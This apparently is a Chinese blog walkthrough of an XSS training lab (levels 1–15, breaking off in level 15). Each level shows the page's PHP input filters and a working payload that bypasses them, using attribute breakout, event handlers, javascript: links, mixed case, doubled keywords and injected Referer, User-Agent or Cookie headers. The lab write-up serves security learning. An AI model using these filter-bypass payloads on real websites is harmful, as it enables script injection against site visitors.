aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接将键盘的值传送给了后台</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/2.png" class>png)<p>&lt;和&gt;都被编码成了html字符实体。</p><p>在level2.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>htmlspecialchars()函数对变量str进行处理之后显示到网页上。(即将&lt;和&gt;都被编码成了html字符实体）但value中并没有使用。</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 闭合前面的，注释后面的。</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><h2 id="尝试："><a href="#尝试：" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/3.png" class><p>在level3.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>两处都使用了htmlspecialchars()函数，就不能使用带有&lt;或&gt;</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token string">'onfocus=javascript:alert('</span>xss'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用之后，当使用鼠标点击该输入框时输入框被选中可以。</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><h2 id="尝试：-1"><a href="#尝试：-1" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/4.png" class><p>在level4.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将变量中的>删除</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将变量中的&lt;删除</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不能使用带有&lt;或&gt;,还是可以使用第三关的题解。</p><h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token string">'onfocus=javascript:alert('</span>xss'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用之后，当使用鼠标点击该输入框时输入框被选中可以。</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><h2 id="尝试1："><a href="#尝试1：" class="headerlink" title="尝试1："></a>尝试1：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/5.png" class><h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><pre class="line-numbers language-php"><code class="language-php">onfocus<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现也未成功，查看一下源码：</p><img src="/posts/84ce/5_2.png" class><p>在level5.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将值进行全小写的转换，然后赋值给str变量。</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过str_replace()函数来破坏变量值中的敏感字符的语义。</p><p>不能用带有script和on的payload</p><h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup">&lt;a href=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="尝试2-1"><a href="#尝试2-1" class="headerlink" title="尝试2"></a>尝试2</h2><pre class="line-numbers language-php"><code class="language-php">onfocus<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;a href=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，错误原因和level 5一样</p><p>在level6.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;script"</span><span class="token punctuation">,</span><span class="token string">"&lt;scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不能使用以上字符，但没转化成小写，因此可以利用大小写混写来绕过</p><h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup">&lt;a HrEf=javascript:alert('xss')></span>xss<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他的大小写混写一样也可以</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><h2 id="尝试：-2"><a href="#尝试：-2" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源码：</p><img src="/posts/84ce/7.png" class><p>尝试其他的语句，也是出现这种情况</p><p>在level7.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">#将参数值转换成小写</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">#将基本的关键词都删掉</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时可使用双写关键字，</p><h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"oonnfocus<span class="token operator">=</span>javascriscriptpt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实就是只要关键字”on” “script”等包含在那个里面，它删掉一个之后，还会保留一个，就可以实现绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><h2 id="尝试1：-1"><a href="#尝试1：-1" class="headerlink" title="尝试1："></a>尝试1：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网页源码为：</p><img src="/posts/84ce/8.png" class><h2 id="尝试2-2"><a href="#尝试2-2" class="headerlink" title="尝试2:"></a>尝试2:</h2><pre class="line-numbers language-php"><code class="language-php">javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源码发现破坏了语义：</p><img src="/posts/84ce/8_2.png" class><p>在level8.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">#将参数值转换成小写</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h2><p>将unicode编码转换成ASCII码，即将javascript:alert(‘xss’)转换成ASCII码即可</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><h2 id="尝试：-3"><a href="#尝试：-3" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看网页源代码，推测要按照他的某个格式来</p><img src="/posts/84ce/9.png" class><p>在leve9.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//'))   #判断如果字符中没有http://的话就会返回false，</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h2><p>跟level 8差不多，先将unicode编码转换成ASCII码，即将javascript:alert(‘xss’)转换成ASCII码，再在后面加一个真正的网址，如//<a href="http://www.baidu.com/">http://www.baidu.com</a>  </p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><h2 id="尝试：-4"><a href="#尝试：-4" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有三个隐藏的表单</p><img src="/posts/84ce/10.png" class><p>分别测试，发现只有t-sort可以写进值（在f12下调试，将表单的type=”hidden”改成type=”text”，再给value取值)</p><h2 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>t_sort<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面的keyword的值不重要，后面的t_sort等于后面的”是闭合value的”</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中:</p><img src="/posts/84ce/10_2.png" class><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><h2 id="尝试：-5"><a href="#尝试：-5" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/11.png" class><p>和level10差不多，原来t_sort仍然是接受参数值的，但是里面的双引号加了htmlspecialchars()函数被编码了。</p><p>在leve11.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#在服务器端将请求头中的referer头的值赋给了str11这个变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么就可以利用这个请求头来绕过。</p><h2 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包，发现没有referer这个请求头，可以加上，然后发现我们添加的referer头的值出现在了t_ref标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">referer<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/11_2.png" class><p>添加完成之后，点击发送即可。</p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中：</p><img src="/posts/84ce/11_3.png" class><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><h2 id="尝试：-6"><a href="#尝试：-6" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/12.png" class><p>和level11差不多，在level 12中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token shell-comment comment">#将请求中User-Agent头的值赋给了变量str11</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以利用这个请求头来绕过。</p><h2 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包,发现我们添加的User-Agent头的值出现在了t_ua标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">User<span class="token operator">-</span>Agent<span class="token punctuation">:</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/12_2.png" class><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中：</p><img src="/posts/84ce/12_3.png" class><h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><h2 id="尝试：-7"><a href="#尝试：-7" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源代码，发现有四个隐藏的表单：</p><img src="/posts/84ce/13.png" class><p>和level12差不多，在level 13中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将请求中cookie的值赋给了变量str11</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用cookie来绕过。</p><h2 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h2><h3 id="方法一：-3"><a href="#方法一：-3" class="headerlink" title="方法一："></a>方法一：</h3><p>用burp进行抓包,发现我们添加的cookie的值出现在了t_cook标签的value属性值中了。<br>所以可以直接构造：</p><pre class="line-numbers language-php"><code class="language-php">Cookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token string">"type="</span>text<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/84ce/13_2.png" class><h3 id="方法二：-3"><a href="#方法二：-3" class="headerlink" title="方法二："></a>方法二：</h3><p>在控制台中，将值直接添加在其中</p><img src="/posts/84ce/13_3.png" class><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>本关因iframe调用的文件地址失效，无法进行测试。</p><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><p>在level15.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>angular.min.js<span class="token 